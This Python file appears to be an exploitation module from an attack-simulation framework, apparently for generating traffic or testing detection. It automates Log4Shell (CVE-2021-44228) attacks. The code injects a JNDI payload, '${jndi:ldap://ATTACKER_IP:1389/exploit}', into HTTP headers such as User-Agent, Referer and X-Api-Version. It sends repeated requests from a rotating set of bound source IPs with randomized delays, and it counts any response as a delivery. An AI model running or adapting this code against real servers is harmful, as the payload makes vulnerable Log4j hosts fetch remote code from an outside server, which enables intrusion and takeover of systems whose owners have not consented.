"""Log4Shell (CVE-2021-44228) exploitation module."""

from __future__ import annotations

import logging
import random
import time
from datetime import datetime, timezone

import requests

from attacks.config import PhaseConfig
from attacks.modules.base import AttackModule, AttackModuleRegistry, AttackResult, TimingProfile


@AttackModuleRegistry.register("log4shell")
class Log4ShellModule(AttackModule):
    """Log4Shell JNDI injection via HTTP headers.

    Sends crafted HTTP requests with JNDI lookup strings in various
    headers (X-Api-Version, User-Agent, Referer, etc.) to trigger
    Log4j RCE (CVE-2021-44228).

    Uses aliased source IPs with socket binding for multi-IP attacks.
    """

    def execute(
        self,
        target: str,
        phase: PhaseConfig,
        ips: list[str],
        rng: random.Random,
        logger: logging.Logger,
    ) -> AttackResult:
        port = phase.params.get("target_port", 8080)
        path = phase.params.get("path", "/")
        jndi_template = phase.params.get(
            "jndi_string", "${jndi:ldap://ATTACKER_IP:1389/exploit}"
        )
        injection_headers = phase.params.get(
            "injection_headers", ["X-Api-Version", "User-Agent", "Referer"]
        )
        num_requests = phase.params.get("num_requests", 100)
        timing = TimingProfile(phase.timing)
        duration = phase.timing.duration_seconds

        url = f"http://{target}:{port}{path}"
        start_time = datetime.now(timezone.utc)
        deadline = time.monotonic() + duration
        attempts = 0
        successes = 0
        errors: list[str] = []

        logger.info(
            "Starting Log4Shell attack on %s — %d requests from %d IPs (duration: %ds)",
            url, num_requests, len(ips), duration,
        )

        for i in range(num_requests):
            if time.monotonic() >= deadline:
                logger.info("Duration exceeded, stopping at %d/%d requests", i, num_requests)
                break

            elapsed = time.monotonic() - (deadline - duration)
            progress = min(elapsed / duration, 1.0)

            src_ip = rng.choice(ips)
            header_name = rng.choice(injection_headers)
            jndi_payload = jndi_template.replace("ATTACKER_IP", src_ip)

            success = self._send_exploit(
                url, src_ip, header_name, jndi_payload, logger
            )
            attempts += 1
            if success:
                successes += 1

            # Apply timing profile delay
            delay_ms = timing.get_jitter_ms(progress, rng)
            time.sleep(delay_ms / 1000.0)

        end_time = datetime.now(timezone.utc)
        logger.info(
            "Log4Shell complete: %d requests, %d delivered, %d errors",
            attempts, successes, len(errors),
        )

        return AttackResult(
            phase_name=phase.name,
            module_name=self.name,
            start_time=start_time,
            end_time=end_time,
            source_ips=ips,
            attempts=attempts,
            successes=successes,
            errors=errors[:10],
            metadata={
                "url": url,
                "injection_headers": injection_headers,
                "jndi_template": jndi_template,
            },
        )

    @staticmethod
    def _send_exploit(
        url: str,
        src_ip: str,
        header_name: str,
        jndi_payload: str,
        logger: logging.Logger,
    ) -> bool:
        """Send a single HTTP request with JNDI payload. Returns True on delivery."""
        headers = {
            header_name: jndi_payload,
            "Accept": "*/*",
        }
        # Use a session with source_address binding
        session = requests.Session()
        adapter = SourceIPAdapter(src_ip)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        try:
            session.get(url, headers=headers, timeout=10)
            # Any response means the payload was delivered (even 500/404)
            return True
        except requests.RequestException as e:
            logger.debug("Log4Shell request from %s failed: %s", src_ip, e)
            return False
        finally:
            session.close()


class SourceIPAdapter(requests.adapters.HTTPAdapter):
    """HTTP adapter that binds to a specific source IP."""

    def __init__(self, source_ip: str, **kwargs):
        self.source_ip = source_ip
        super().__init__(**kwargs)

    def init_poolmanager(self, *args, **kwargs):
        kwargs["source_address"] = (self.source_ip, 0)
        super().init_poolmanager(*args, **kwargs)
